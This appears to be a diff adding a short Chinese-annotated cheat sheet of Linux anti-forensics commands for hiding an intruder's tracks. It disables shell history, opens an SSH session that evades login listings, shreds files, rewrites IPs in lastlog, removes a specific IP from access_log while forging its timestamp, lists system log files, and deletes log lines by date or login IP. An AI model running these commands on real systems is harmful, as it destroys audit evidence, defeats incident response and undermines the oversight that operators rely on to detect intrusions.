@@ -1,0 +1,32 @@
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 //设置不记录history
+
+ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i //分配伪终端，w看不见
+
+shred -n 31337 -z -u file_to_delete //覆盖多次删除
+
+sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog
+
+touch /dev/shm/timestamp; touch -r access_log /dev/shm/timestamp;
+sed '/192\.168\.44\.1/d' access_log > /dev/shm/backlog ;   //主要操作
+cat /dev/shm/backlog > access_log; touch -r /dev/shm/timestamp ./access_log ;shred -n 255 -z -u /dev/shm/timestamp;
+
+
+
+
+日志文件
+/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一
+/var/log/secure 与安全相关的日志信息
+/var/log/maillog 与邮件相关的日志信息
+/var/log/cron 与定时任务相关的日志信息
+/var/log/spooler 与UUCP和news设备相关的日志信息
+/var/log/boot.log 守护进程启动和停止相关的日志消息
+/var/log/btmp – 记录所有失败登录信息 命令:lastb
+/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)
+
+删除部分日志,比如以当天日期或者自己的登录ip
+
+sed  -i '/当前时间/'d  /var/log/messages
+
+
+使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,
+但是在/var/log/secure会有sftp连接记录
